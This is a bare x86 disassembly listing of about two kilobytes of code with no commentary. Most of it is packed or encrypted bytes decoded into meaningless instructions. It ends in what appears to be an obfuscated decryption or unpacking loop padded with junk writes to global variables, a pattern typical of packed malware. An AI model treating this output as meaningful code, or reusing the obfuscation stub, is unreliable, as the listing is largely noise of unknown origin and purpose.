  4030c4:	test   DWORD PTR [ecx+ebp*2+0x55788583],eax
  4030cb:	push   ds
  4030cc:	jb     0x40309e
  4030ce:	mov    WORD PTR [edi],?
  4030d0:	fsubr  DWORD PTR [edi-0x1c689d04]
  4030d6:	xchg   esi,eax
  4030d7:	addr16 daa 
  4030d9:	lods   al,BYTE PTR ds:[esi]
  4030da:	(bad)  
  4030db:	call   DWORD PTR [edx-0x63b20b6e]
  4030e1:	aad    0x53
  4030e3:	fs inc esp
  4030e5:	mov    eax,ds:0xd5a91b1f
  4030ea:	push   ecx
  4030eb:	sahf   
  4030ec:	gs mov edx,0xa91ca17
  4030f2:	sti    
  4030f3:	cld    
  4030f4:	mov    eax,ds:0x99c95716
  4030f9:	lock add BYTE PTR [ebx],0x69
  4030fd:	fdiv   QWORD PTR [esi]
  4030ff:	cs jp  0x403160
  403102:	mov    eax,ds:0x58b207ca
  403107:	mov    dl,0x45
  403109:	push   edi
  40310a:	adc    bh,BYTE PTR [ecx]
  40310c:	or     ebp,esi
  40310e:	dec    DWORD PTR [eax-0x52cf1bdc]
  403114:	cmp    eax,0xb301ff3d
  403119:	inc    ecx
  40311a:	pushfw 
  40311c:	inc    ecx
  40311d:	cmp    esp,esi
  40311f:	sub    DWORD PTR [esi],0x72a9eb96
  403125:	adc    eax,0x667183b3
  40312a:	icebp  
  40312b:	neg    DWORD PTR [eax]
  40312d:	mov    al,0x68
  40312f:	sbb    BYTE PTR [ebp+0x3],0x3d
  403133:	bound  ecx,QWORD PTR [eax+eax*4+0x1d5b0fb8]
  40313a:	inc    ebx
  40313b:	fnstenv [ecx-0x58]
  40313e:	dec    DWORD PTR [edx-0x5a]
  403141:	pop    ds
  403142:	iret   
  403143:	jo     0x40312d
  403145:	jg     0x4030fa
  403147:	pop    ds
  403148:	enter  0x3231,0x21
  40314c:	shl    BYTE PTR [eax+0x7e77b33b],1
  403152:	retf   0x643a
  403155:	aad    0x15
  403157:	jb     0x4031b4
  403159:	jle    0x4030e5
  40315b:	push   ss
  40315c:	ins    DWORD PTR es:[edi],dx
  40315d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40315e:	pusha  
  40315f:	lds    edi,FWORD PTR [eax-0x41]
  403162:	fsubr  DWORD PTR [edi+0x755ed728]
  403168:	out    0xb5,al
  40316a:	and    BYTE PTR [esi],0x3b
  40316d:	or     DWORD PTR [edx-0x68],esi
  403170:	xchg   edi,eax
  403171:	int3   
  403172:	test   DWORD PTR [ecx-0x455f1429],ebx
  403178:	add    edx,ebx
  40317a:	stc    
  40317b:	cmp    cl,BYTE PTR [edx]
  40317d:	bound  esi,QWORD PTR [ebx*2-0x3ec5b796]
  403184:	fstp   QWORD PTR [ebp-0x4fb5f057]
  40318a:	mov    ecx,0xaea5abcb
  40318f:	out    0x6d,eax
  403191:	cmp    dl,BYTE PTR [edi-0x5c021adb]
  403197:	cli    
  403198:	jmp    0xc1f30ed1
  40319d:	test   BYTE PTR [ecx],ah
  40319f:	aad    0xbc
  4031a1:	mov    ch,0x92
  4031a3:	jecxz  0x403199
  4031a5:	and    eax,edx
  4031a7:	jae    0x403170
  4031a9:	dec    esp
  4031aa:	xchg   bp,ax
  4031ac:	cmp    al,0x0
  4031ae:	sbb    dh,BYTE PTR [ecx+0x4523cd54]
  4031b4:	lds    edi,FWORD PTR [ebx]
  4031b6:	jb     0x403165
  4031b8:	dec    eax
  4031b9:	push   edx
  4031ba:	adc    bh,ch
  4031bc:	ror    DWORD PTR [esi],1
  4031be:	pop    ebx
  4031bf:	mov    ebx,0xbb22f271
  4031c4:	push   esi
  4031c5:	std    
  4031c6:	imul   edx,DWORD PTR [ecx+0x12],0xd55057fa
  4031cd:	imul   edx,edi,0x55
  4031d0:	or     DWORD PTR [esi+0x2a],ecx
  4031d3:	inc    edx
  4031d4:	adc    ebx,DWORD PTR [esi]
  4031d6:	aad    0x52
  4031d8:	sbb    al,0xc6
  4031da:	adc    edx,esi
  4031dc:	sysret 
  4031de:	scas   eax,DWORD PTR es:[edi]
  4031df:	mov    ds:0xacd60a95,eax
  4031e4:	aas    
  4031e5:	xchg   edi,eax
  4031e6:	mov    esp,0x805e1b12
  4031eb:	pop    edi
  4031ec:	add    al,BYTE PTR [edi+eiz*1+0x4bba5532]
  4031f3:	in     al,dx
  4031f4:	ins    DWORD PTR es:[edi],dx
  4031f5:	pop    ss
  4031f6:	jle    0x403258
  4031f8:	les    edx,FWORD PTR [edx-0x53]
  4031fb:	mov    dl,ch
  4031fd:	imul   edx,DWORD PTR [ecx+eiz*1],0x66
  403201:	call   0x721ebefe
  403206:	loop   0x403229
  403208:	mov    dl,0x7
  40320a:	lahf   
  40320b:	jb     0x40318d
  40320d:	mov    ebx,0xf3686aef
  403212:	xchg   esi,eax
  403213:	or     esp,DWORD PTR [edi-0x51b251a]
  403219:	mul    BYTE PTR [edi-0x610262d0]
  40321f:	or     eax,0x32a4fa77
  403224:	push   ebp
  403225:	add    eax,0x61f7c6c1
  40322a:	popf   
  40322b:	jge    0x403222
  40322d:	dec    ebx
  40322e:	test   eax,0x83f07b1c
  403233:	loopne 0x4031d9
  403235:	fcompp 
  403237:	mov    al,0xa6
  403239:	adc    BYTE PTR [eax+0x3f],al
  40323c:	or     al,0x8e
  40323e:	mov    ecx,0xcb9978a7
  403243:	push   cs
  403244:	ins    BYTE PTR es:[edi],dx
  403245:	xchg   edi,eax
  403246:	popa   
  403247:	leave  
  403248:	(bad)  
  403249:	and    edi,DWORD PTR [eax+esi*8-0x7]
  40324d:	imul   edi,DWORD PTR ds:0xfa174073,0x78
  403254:	int    0x7f
  403256:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403257:	push   edx
  403258:	push   esi
  403259:	mov    DWORD PTR [ebp-0x430301fe],eax
  40325f:	shl    BYTE PTR [esi-0x3c9f3cbd],0xe9
  403266:	sbb    DWORD PTR [edx+0x564c6c95],edx
  40326c:	vpmadcsswd xmm0,xmm6,xmm2,xmm6
  403272:	stos   DWORD PTR es:[edi],eax
  403273:	mov    al,0x48
  403275:	iret   
  403276:	jecxz  0x403274
  403278:	(bad)  
  403279:	lea    edx,[edi+0x10102e55]
  40327f:	jne    0x403211
  403281:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403282:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403283:	sub    eax,DWORD PTR [ebx+0x7c]
  403286:	pop    ss
  403287:	mov    al,ds:0xf2e979d5
  40328c:	jmp    0x403283
  40328e:	fiadd  DWORD PTR [ebx]
  403290:	lea    esp,[edi+0x2b44c52f]
  403296:	jnp    0x4032e1
  403298:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403299:	test   eax,esi
  40329b:	adc    al,0x37
  40329d:	loope  0x40328e
  40329f:	sub    BYTE PTR [edx],ah
  4032a1:	mov    dl,0x1
  4032a3:	fldl2t 
  4032a5:	sub    eax,0x79834242
  4032aa:	fisub  WORD PTR [ebx+0x25]
  4032ad:	jnp    0x40329e
  4032af:	js     0x40331e
  4032b1:	out    dx,eax
  4032b2:	fistp  WORD PTR [ecx+0x6]
  4032b5:	std    
  4032b6:	add    eax,0x758dfbae
  4032bb:	lock xchg ebp,eax
  4032bd:	or     DWORD PTR [eax+ebp*1-0x3af83268],esp
  4032c4:	(bad)  
  4032c5:	(bad)  
  4032c6:	out    0x9d,al
  4032c8:	fdiv   st,st(6)
  4032ca:	lods   eax,DWORD PTR ds:[esi]
  4032cb:	adc    dl,dl
  4032cd:	push   ss
  4032ce:	(bad)  
  4032cf:	jmp    0xe9d0:0x3332657e
  4032d6:	int    0x93
  4032d8:	arpl   di,bp
  4032da:	xchg   ecx,eax
  4032db:	retf   0x753c
  4032de:	call   0x45bbcbe5
  4032e3:	out    dx,al
  4032e4:	jle    0x4032c6
  4032e6:	push   ecx
  4032e7:	rcl    BYTE PTR [edi+0x653f8993],1
  4032ed:	data16 in al,dx
  4032ef:	pushf  
  4032f0:	pop    esi
  4032f1:	loope  0x4032f4
  4032f3:	out    dx,al
  4032f4:	cdq    
  4032f5:	push   ss
  4032f6:	inc    edx
  4032f7:	out    0x59,eax
  4032f9:	jno    0x40333f
  4032fb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4032fc:	icebp  
  4032fd:	mov    ?,WORD PTR [eax+0x62]
  403300:	cmp    eax,0xf19b7f4a
  403305:	xchg   ebp,eax
  403306:	mov    DWORD PTR [ebp-0x40c41039],ecx
  40330c:	std    
  40330d:	xchg   ebx,eax
  40330e:	stos   DWORD PTR es:[edi],eax
  40330f:	push   edi
  403310:	adc    ebx,DWORD PTR [edx-0x4f16a1b0]
  403316:	push   esp
  403317:	repz mov WORD PTR [ebx+0x4],ss
  40331b:	loop   0x4032df
  40331d:	sub    DWORD PTR [ecx+0x3359bedf],0xffffffa6
  403324:	mov    ah,bh
  403326:	mov    esi,0x872cf3e9
  40332b:	lods   eax,DWORD PTR ds:[esi]
  40332c:	xchg   edi,eax
  40332d:	xor    eax,0x7bfdf27e
  403332:	cmp    ah,bh
  403334:	stos   BYTE PTR es:[edi],al
  403335:	cmovbe esp,DWORD PTR [ecx+0x70]
  403339:	hlt    
  40333a:	(bad)  [edx+edi*4-0x5d4bcf79]
  403341:	outs   dx,BYTE PTR ds:[esi]
  403342:	jne    0x40337d
  403344:	pop    es
  403345:	xchg   ebp,eax
  403346:	xor    cl,al
  403348:	in     eax,dx
  403349:	sub    ebp,esi
  40334b:	dec    esi
  40334c:	neg    BYTE PTR [ebx+0x55d70ff5]
  403352:	mov    ch,0xa8
  403354:	repnz icebp 
  403356:	cwde   
  403357:	add    al,0xfb
  403359:	fcmovnu st,st(0)
  40335b:	adc    esi,DWORD PTR [edx]
  40335d:	cld    
  40335e:	push   esp
  40335f:	rcr    BYTE PTR [ecx+edi*4-0x794242de],0x15
  403367:	mov    bl,0x4b
  403369:	sbb    DWORD PTR [eax-0xdd01be0],esi
  40336f:	shr    BYTE PTR [esi+0x4aa3ce5],0xe8
  403376:	mov    dl,0xb1
  403378:	mov    DWORD PTR [eax+0x12],ebp
  40337b:	lods   eax,DWORD PTR ds:[esi]
  40337c:	ficom  WORD PTR [edx-0x49]
  40337f:	xchg   esi,ecx
  403381:	sub    ebp,DWORD PTR [ebp-0x65]
  403384:	imul   ebp,DWORD PTR [ecx-0x1778b51f],0xe5460c44
  40338e:	and    edx,DWORD PTR [edx]
  403390:	pusha  
  403391:	aam    0x47
  403393:	lods   al,BYTE PTR ds:[esi]
  403394:	push   ebx
  403395:	lahf   
  403396:	and    BYTE PTR [eax],bl
  403398:	mov    dl,0x11
  40339a:	mov    ds:0x6b0737dc,eax
  40339f:	frstor [edi]
  4033a1:	dec    edi
  4033a2:	shl    esi,1
  4033a4:	sub    eax,0xfe0d3ca4
  4033a9:	pop    esp
  4033aa:	inc    eax
  4033ab:	test   BYTE PTR [esi+0x7a],ah
  4033ae:	(bad)  
  4033af:	ss sti 
  4033b1:	ins    BYTE PTR es:[edi],dx
  4033b2:	mov    esi,0x4d5b9d5e
  4033b7:	cmc    
  4033b8:	aad    0x8d
  4033ba:	or     eax,DWORD PTR [ebp-0x76]
  4033bd:	mov    ecx,0x5070b9a6
  4033c2:	jae    0x40335c
  4033c4:	sub    DWORD PTR [edi+0xfc34c66],eax
  4033ca:	jp     0x403389
  4033cc:	cld    
  4033cd:	lds    esp,FWORD PTR [edx]
  4033cf:	sub    DWORD PTR [ebp+0x27],0xa3e362bf
  4033d6:	es retf 0x6831
  4033da:	sahf   
  4033db:	jne    0x403427
  4033dd:	dec    esp
  4033de:	(bad)  
  4033df:	mov    al,ds:0xeaaa5f5c
  4033e4:	les    edx,FWORD PTR [eax]
  4033e6:	mov    dl,0x73
  4033e8:	call   0x2336295f
  4033ed:	stos   DWORD PTR es:[edi],eax
  4033ee:	mov    edx,0x7398c4df
  4033f3:	in     al,0x24
  4033f5:	adc    cl,BYTE PTR [ebx+0x69e7059]
  4033fb:	imul   BYTE PTR ds:0x19c07560
  403401:	jge    0x40340e
  403403:	mov    bl,0xe
  403405:	das    
  403406:	sub    eax,0x3abd23ab
  40340b:	(bad)  
  40340c:	cld    
  40340d:	push   es
  40340e:	(bad)  
  403410:	div    BYTE PTR [eax+0x1cf649f0]
  403416:	outs   dx,BYTE PTR ds:[esi]
  403417:	xor    DWORD PTR [eax-0x56],ebx
  40341a:	mov    al,0xb
  40341c:	mov    WORD PTR [ebx],ss
  40341e:	pop    ds
  40341f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403420:	out    0x1f,al
  403422:	jp     0x403441
  403424:	loopne 0x40341f
  403426:	jb     0x4033ae
  403428:	pop    ebp
  403429:	mov    bh,0x47
  40342b:	pop    es
  40342c:	retf   
  40342d:	test   al,0x0
  40342f:	sti    
  403430:	cmp    DWORD PTR [ebx],ecx
  403432:	mov    ch,BYTE PTR [esi+0x6848ceb1]
  403438:	pop    edi
  403439:	je     0x4033f3
  40343b:	jg     0x403422
  40343d:	mov    ss,WORD PTR [ebx+0x71]
  403440:	arpl   WORD PTR [edi+eiz*1-0x4ef05344],cx
  403447:	mov    al,0x54
  403449:	lods   eax,DWORD PTR ds:[esi]
  40344a:	cld    
  40344b:	xor    BYTE PTR [esi],0x21
  40344e:	lock outs dx,BYTE PTR ds:[esi]
  403450:	add    BYTE PTR [di+0x6aff],0xb9
  403456:	gs dec eax
  403458:	xor    DWORD PTR [ecx+0x2b],edi
  40345b:	(bad)  
  40345c:	je     0x40345f
  40345e:	cmp    al,0x26
  403460:	xchg   ecx,eax
  403461:	ins    DWORD PTR es:[edi],dx
  403462:	cmp    al,0xd5
  403464:	jne    0x40340e
  403466:	jmp    0xb996:0xd977c0bb
  40346d:	into   
  40346e:	int    0xd6
  403470:	jnp    0x40340a
  403472:	add    ah,BYTE PTR [edx]
  403474:	jecxz  0x403400
  403476:	or     al,0x2b
  403478:	adc    esi,edi
  40347a:	jp     0x4034b9
  40347c:	bound  edx,QWORD PTR [edx]
  40347e:	imul   ebx,DWORD PTR [edi+0x45],0xfffffffc
  403482:	fisttp DWORD PTR [ebx-0x7b]
  403485:	in     al,dx
  403486:	cmc    
  403487:	mov    bh,0xd1
  403489:	cwde   
  40348a:	rcr    cl,1
  40348c:	mov    ah,BYTE PTR [edi+0x3f]
  40348f:	dec    ebp
  403490:	adc    dh,BYTE PTR [ecx]
  403492:	mov    ah,0x32
  403494:	mov    eax,ds:0xa497fe68
  403499:	jecxz  0x4034b4
  40349b:	or     edi,DWORD PTR [edx]
  40349d:	mov    bl,0x3
  40349f:	dec    ebp
  4034a0:	in     al,dx
  4034a1:	test   al,0x67
  4034a3:	inc    eax
  4034a4:	pusha  
  4034a5:	lods   eax,DWORD PTR ds:[esi]
  4034a6:	adc    al,dh
  4034a8:	jmp    0xb50208f8
  4034ad:	cmc    
  4034ae:	pop    ebx
  4034af:	fs popa 
  4034b1:	mov    ecx,0xf2996a8
  4034b6:	in     al,0x79
  4034b8:	xchg   ecx,eax
  4034b9:	(bad)  [esi]
  4034bb:	inc    eax
  4034bc:	mov    ebp,0xd6c5278b
  4034c1:	fucomi st,st(0)
  4034c3:	jmp    0x67dd:0x5d3360ff
  4034ca:	inc    esp
  4034cb:	fsub   DWORD PTR [ebx+0x33136db1]
  4034d1:	adc    BYTE PTR [ebp-0x46277d3a],dh
  4034d7:	mov    ds:0x42076c31,al
  4034dc:	idiv   BYTE PTR [esi+0x522e680c]
  4034e2:	ss jne 0x403486
  4034e5:	inc    ebp
  4034e6:	jecxz  0x403490
  4034e8:	addr16 (bad) 
  4034ea:	ficom  DWORD PTR [eax-0xa]
  4034ed:	xor    al,0x99
  4034ef:	pop    ebp
  4034f0:	es cmp ebx,edi
  4034f3:	cwde   
  4034f4:	mov    WORD PTR [edx],?
  4034f6:	push   eax
  4034f7:	mov    edx,0xbb12b12e
  4034fc:	arpl   WORD PTR [edx-0x3bbe84cd],sp
  403502:	dec    ecx
  403503:	push   ss
  403504:	jge    0x403505
  403506:	mov    ecx,0xe16fe762
  40350b:	cmp    edx,esp
  40350d:	into   
  40350e:	mov    al,ds:0xbd7d9361
  403513:	push   ecx
  403514:	adc    ecx,edx
  403516:	ror    BYTE PTR [edi],1
  403518:	sub    edi,DWORD PTR [eax+0x16]
  40351b:	cmp    al,0x70
  40351d:	mov    edi,0x3cf23f7d
  403522:	add    BYTE PTR [eax-0x420a7194],ch
  403528:	adc    esi,DWORD PTR ds:0x5feb3831
  40352e:	(bad)  
  40352f:	shr    DWORD PTR [eax+ebx*8],cl
  403532:	cmp    eax,0x54ffe651
  403537:	daa    
  403538:	fisub  WORD PTR [eax-0x4ceb528b]
  40353e:	push   edx
  40353f:	pusha  
  403540:	jl     0x403550
  403542:	ret    
  403543:	enter  0xa8b2,0x92
  403547:	mov    fs,WORD PTR [ebx+0x10]
  40354a:	lock mov eax,ds:0x80dab460
  403550:	cld    
  403551:	cmp    DWORD PTR [ebp-0x40],ebp
  403554:	(bad)  
  403555:	fidivr DWORD PTR [ebx-0x5b]
  403558:	inc    esp
  403559:	dec    edx
  40355a:	lahf   
  40355b:	push   ecx
  40355c:	add    al,BYTE PTR [ebx]
  40355e:	mov    bl,0x49
  403560:	in     al,dx
  403561:	jmp    0xbbe7f156
  403566:	mov    DWORD PTR [eax-0x33],ebp
  403569:	cmp    DWORD PTR [ebp+0x1f4169b7],ebx
  40356f:	push   esi
  403570:	sbb    edx,DWORD PTR [esi-0x2ef8e1b5]
  403576:	mov    WORD PTR [eax+ebx*1],es
  403579:	mov    ds:0xc567694c,al
  40357e:	not    DWORD PTR [edi-0x65]
  403581:	fstp   QWORD PTR [edx+eax*8]
  403584:	in     eax,0xa0
  403586:	addr16 std 
  403588:	and    edi,DWORD PTR [ebx-0x41dede2c]
  40358e:	mov    BYTE PTR [edx-0x756a56f],ah
  403594:	sub    eax,esi
  403596:	pusha  
  403597:	inc    esp
  403598:	and    eax,0x6df184e4
  40359d:	inc    eax
  40359e:	out    dx,eax
  40359f:	adc    al,0x4b
  4035a1:	mov    esi,0x61320e13
  4035a6:	add    ah,0x4c
  4035a9:	push   edi
  4035aa:	(bad)  
  4035ab:	pop    esp
  4035ac:	or     dl,ch
  4035ae:	jmp    FWORD PTR [ebp+0x6290c6e]
  4035b4:	addr16 rol dl,0x5d
  4035b8:	ds cmp dh,ch
  4035bb:	out    0xdc,eax
  4035bd:	fdiv   DWORD PTR fs:[ebx-0x238c319]
  4035c4:	fsub   st,st(1)
  4035c6:	or     DWORD PTR [ebp+0x38],0x43
  4035ca:	sbb    al,0xf0
  4035cc:	jo     0x403628
  4035ce:	xor    al,0x12
  4035d0:	test   al,0x28
  4035d2:	pop    es
  4035d3:	and    DWORD PTR gs:[esi+0x1e],ecx
  4035d7:	loope  0x403613
  4035d9:	ret    0xa820
  4035dc:	es mov bl,0x21
  4035df:	daa    
  4035e0:	push   es
  4035e1:	pop    ebp
  4035e2:	rcr    ch,0x71
  4035e5:	loop   0x403586
  4035e7:	scas   eax,DWORD PTR es:[edi]
  4035e8:	xchg   DWORD PTR [edx],ecx
  4035ea:	inc    ebx
  4035eb:	adc    al,0x4e
  4035ed:	loop   0x403613
  4035ef:	dec    eax
  4035f0:	mov    ebp,0xd185f2d2
  4035f5:	nop
  4035f6:	outs   dx,DWORD PTR ds:[esi]
  4035f7:	mov    al,0xb2
  4035f9:	call   0x66c9:0xbb753121
  403600:	mov    al,ds:0x236fc69e
  403605:	fwait
  403606:	jne    0x403686
  403608:	stos   DWORD PTR es:[edi],eax
  403609:	xchg   cl,ch
  40360b:	mov    BYTE PTR [ebp-0xe],ah
  40360e:	arpl   sp,dx
  403610:	fwait
  403611:	mov    dh,0xa3
  403613:	scas   eax,DWORD PTR es:[edi]
  403614:	aas    
  403615:	pushf  
  403616:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403617:	and    eax,edi
  403619:	es inc esi
  40361b:	or     eax,0x57f3016d
  403620:	cli    
  403621:	xor    al,0xa0
  403623:	rcr    BYTE PTR [edi-0x6b],cl
  403626:	or     eax,0x8d868d7
  40362b:	es popf 
  40362d:	mov    ss,ebx
  40362f:	mov    dh,0x9e
  403631:	dec    esi
  403632:	add    edi,DWORD PTR [edx+0x1a]
  403635:	pop    edx
  403636:	mov    edx,0xcb6effb0
  40363b:	int3   
  40363c:	stos   BYTE PTR es:[edi],al
  40363d:	test   eax,0xad4b0c8b
  403642:	aad    0xf7
  403644:	fcmovnu st,st(7)
  403646:	mov    eax,ds:0x97b8dfd3
  40364b:	add    eax,0xd45098ca
  403650:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403651:	jae    0x403620
  403653:	add    bl,bh
  403655:	add    al,0x75
  403657:	or     al,0x75
  403659:	cmp    eax,0x711dd112
  40365e:	cmp    al,0xe0
  403660:	rcl    DWORD PTR [ebx+0x55],cl
  403663:	or     al,0xb9
  403665:	retf   0x96db
  403668:	adc    BYTE PTR [esi+eiz*4+0x3a],ah
  40366c:	je     0x40361a
  40366e:	in     al,0xbf
  403670:	push   cs
  403671:	jo     0x4036c9
  403673:	cmc    
  403674:	adc    edx,esi
  403676:	bound  edi,QWORD PTR [eax+0x2b]
  403679:	test   eax,0xbcd3cd1d
  40367e:	es dec ebp
  403680:	test   BYTE PTR [edi+0x23],bh
  403683:	or     edx,esi
  403685:	outs   dx,BYTE PTR ds:[esi]
  403686:	mov    eax,0x7344ec87
  40368b:	and    eax,0x92b8dce3
  403690:	adc    al,0x69
  403692:	or     BYTE PTR [ebp-0x6fd4d13b],cl
  403698:	dec    eax
  403699:	lds    esi,FWORD PTR [edi+ebx*1+0x5f]
  40369d:	jp     0x403680
  40369f:	xchg   esp,eax
  4036a0:	cmp    bh,BYTE PTR [ecx]
  4036a2:	bound  edi,QWORD PTR [edx+ebp*1-0xfa68166]
  4036a9:	jmp    0x4c04:0xbba49d89
  4036b0:	shl    BYTE PTR [ebp-0x64c6f163],cl
  4036b6:	out    dx,al
  4036b7:	cmp    ecx,DWORD PTR [ecx-0x45]
  4036ba:	jo     0x403685
  4036bc:	cmc    
  4036bd:	or     eax,0x5545cb18
  4036c2:	pop    ecx
  4036c3:	repnz mov cs,ebp
  4036c6:	adc    eax,0xde7d365a
  4036cb:	mov    al,ds:0xa86d0029
  4036d0:	retf   
  4036d1:	daa    
  4036d2:	aad    0xfd
  4036d4:	arpl   WORD PTR [edi],di
  4036d6:	cmp    eax,0xac49698a
  4036db:	std    
  4036dc:	icebp  
  4036dd:	and    BYTE PTR [ecx],al
  4036df:	imul   esi,DWORD PTR [edx-0x2b],0xc96e43f3
  4036e6:	aas    
  4036e7:	iret   
  4036e8:	(bad)  
  4036e9:	in     al,0xa4
  4036eb:	mov    bh,0xa8
  4036ed:	call   0x775:0x28657c06
  4036f4:	dec    ecx
  4036f5:	pcmpeqb mm2,QWORD PTR [edi-0x15]
  4036f9:	fldenv [edx+edi*1+0x2a843c1c]
  403700:	pop    esi
  403701:	lahf   
  403702:	sbb    DWORD PTR [edx-0x59a4c2df],eax
  403708:	or     edi,ebp
  40370a:	nop
  40370b:	jo     0x403763
  40370d:	push   ds
  40370e:	out    dx,al
  40370f:	or     dh,BYTE PTR [eax-0x15]
  403712:	and    eax,0x303e6028
  403717:	or     edx,DWORD PTR [edx]
  403719:	push   edi
  40371a:	std    
  40371b:	jbe    0x403791
  40371d:	outs   dx,DWORD PTR ds:[esi]
  40371e:	push   ebp
  40371f:	cdq    
  403720:	mov    ebp,0xf7b510c8
  403725:	or     DWORD PTR [ebp-0x618c9c39],esp
  40372b:	(bad)  
  40372c:	mov    al,0x5b
  40372e:	inc    eax
  40372f:	adc    DWORD PTR [esi+0x11],0xab9543a0
  403736:	outs   dx,BYTE PTR ds:[esi]
  403737:	mov    dh,0xfe
  403739:	outs   dx,DWORD PTR ds:[esi]
  40373a:	in     al,dx
  40373b:	shl    DWORD PTR [edx+0x1103f360],0xfe
  403742:	and    al,BYTE PTR [esp+edi*4+0x1ca5b6be]
  403749:	mov    bl,0x85
  40374b:	mov    edi,0x289851e8
  403750:	push   edi
  403751:	push   eax
  403752:	fidivr DWORD PTR [ebx]
  403754:	xor    bh,BYTE PTR [esi-0x53e43b33]
  40375a:	je     0x40375e
  40375c:	xchg   esi,eax
  40375d:	jecxz  0x40379d
  40375f:	rcl    DWORD PTR [esi],1
  403761:	inc    eax
  403762:	pop    ss
  403763:	sub    BYTE PTR [esi-0x55],dh
  403766:	enter  0x9029,0xb2
  40376a:	lock test DWORD PTR [edi+0x21c99766],edx
  403771:	push   edi
  403772:	sub    cl,bl
  403774:	popf   
  403775:	icebp  
  403776:	or     eax,0x2a7669c
  40377b:	out    dx,al
  40377c:	adc    al,0x9d
  40377e:	enter  0xa40c,0xeb
  403782:	jmp    0xa991:0xbf158f7e
  403789:	stc    
  40378a:	cmovle ebx,DWORD PTR [edi]
  40378d:	pop    edi
  40378e:	mov    dh,0x7
  403790:	loop   0x403735
  403792:	(bad)  
  403793:	mov    bl,0xf4
  403795:	xor    DWORD PTR [edx-0x47],eax
  403798:	aaa    
  403799:	ins    DWORD PTR es:[edi],dx
  40379a:	inc    esp
  40379b:	and    eax,0x7874bbd2
  4037a0:	test   BYTE PTR [edi+0xf],bl
  4037a3:	ins    DWORD PTR es:[edi],dx
  4037a4:	and    al,0x25
  4037a6:	dec    ecx
  4037a7:	xor    esi,DWORD PTR [esi-0x1]
  4037aa:	int3   
  4037ab:	(bad)  
  4037ac:	in     al,0xef
  4037ae:	push   ds
  4037af:	sbb    eax,0xcb9d8901
  4037b4:	mov    dl,0xfd
  4037b6:	mov    esi,0x8eb555ff
  4037bb:	jp     0x4037d1
  4037bd:	nop
  4037be:	mov    BYTE PTR [ebx-0x39],ah
  4037c1:	pushf  
  4037c2:	dec    ebx
  4037c3:	fist   DWORD PTR [ebp+0x6e5fe80e]
  4037c9:	rol    BYTE PTR [edx-0x54c86c13],0x11
  4037d0:	dec    eax
  4037d1:	add    BYTE PTR gs:[esi+0x20],al
  4037d5:	jne    0x403821
  4037d7:	mov    bl,0xd7
  4037d9:	fadd   st,st(7)
  4037db:	not    DWORD PTR [ecx+0x41ca5f8e]
  4037e1:	mov    bh,0xc6
  4037e3:	outs   dx,DWORD PTR ds:[esi]
  4037e4:	loopne 0x40384b
  4037e6:	push   es
  4037e7:	sub    BYTE PTR [esi+eax*4-0x36306ce6],ah
  4037ee:	push   ss
  4037ef:	and    eax,DWORD PTR [ecx]
  4037f1:	dec    edi
  4037f2:	test   eax,0x2117d62c
  4037f7:	xor    DWORD PTR [esp+esi*4-0x65],edx
  4037fb:	retf   0x347c
  4037fe:	shl    BYTE PTR ds:0xd08d721d,0xf9
  403805:	in     eax,0xa
  403807:	mov    ebx,0x777419e2
  40380c:	outs   dx,DWORD PTR ds:[esi]
  40380d:	std    
  40380e:	rcl    DWORD PTR [esi-0x18],cl
  403811:	xchg   ebp,eax
  403812:	scas   al,BYTE PTR es:[edi]
  403813:	je     0x4037f0
  403815:	mov    eax,DWORD PTR [ebp-0x10]
  403818:	mov    ecx,DWORD PTR [ebp-0x10]
  40381b:	xor    eax,esi
  40381d:	xor    ecx,esi
  40381f:	sub    DWORD PTR ds:0x428eb3,0x5e8a
  403829:	lea    ecx,[eax+ecx*1+0x64e5ec]
  403830:	mov    eax,DWORD PTR [ebp-0xc]
  403833:	sbb    DWORD PTR ds:0x428e97,0x428e5b
  40383d:	xor    edx,edx
  40383f:	adc    DWORD PTR ds:0x428e4b,0x428eab
  403849:	div    ecx
  40384b:	movzx  eax,WORD PTR ds:0x428e2b
  403852:	add    DWORD PTR ds:0x428eb3,eax
  403858:	mov    eax,DWORD PTR [ebp-0x8]
  40385b:	mov    DWORD PTR ds:0x428e57,0x1e
  403865:	cmp    DWORD PTR ds:0x428e57,0x0
  40386c:	je     0x4038bb
  403872:	cmp    DWORD PTR ds:0x428e57,0x9
  403879:	jb     0x4038bb
  40387f:	jmp    0x40388d
  403884:	push   DWORD PTR [ebp-0x10]
  403887:	call   DWORD PTR ds:0x42a9db
  40388d:	cmp    DWORD PTR ds:0x428e57,0xa
  403894:	jne    0x4038a7
  40389a:	mov    ecx,DWORD PTR ds:0x428e57
  4038a0:	dec    ecx
  4038a1:	mov    DWORD PTR ds:0x428e57,ecx
  4038a7:	xor    ecx,ecx
  4038a9:	add    ecx,DWORD PTR ds:0x428e57
  4038af:	dec    ecx
  4038b0:	mov    DWORD PTR ds:0x428e57,ecx
  4038b6:	jmp    0x403865
  4038bb:	mov    ecx,DWORD PTR [ebp-0x10]
  4038be:	xor    eax,esi
  4038c0:	xor    ecx,esi
  4038c2:	sub    eax,ecx
  4038c4:	mov    DWORD PTR ds:0x428e43,0x1a6e
  4038ce:	cmp    edx,eax
  4038d0:	mov    DWORD PTR ds:0x428e43,0x4c12
  4038da:	jne    0x403ae6
  4038e0:	mov    eax,DWORD PTR [ebp-0xc]
  4038e3:	mov    dl,BYTE PTR [eax+ebx*1+0x800]
  4038ea:	sbb    eax,DWORD PTR ds:0x428ec3
  4038f0:	mov    eax,DWORD PTR [ebp-0x28]
  4038f3:	mov    ecx,DWORD PTR [ebp-0x18]
  4038f6:	or     DWORD PTR ds:0x428ec3,0x7d0f
  403900:	xor    eax,esi
  403902:	xor    ecx,esi
  403904:	add    eax,edi
  403906:	add    ecx,edi
  403908:	mov    BYTE PTR [ebp-0x21],dl
  40390b:	mov    DWORD PTR ds:0x428e57,0x12ce
  403915:	cmp    eax,ecx
  403917:	mov    DWORD PTR ds:0x428eab,0x3e33
  403921:	jae    0x403a8f
  403927:	mov    edx,DWORD PTR ds:0x428e57
  40392d:	xor    DWORD PTR ds:0x428e87,edx
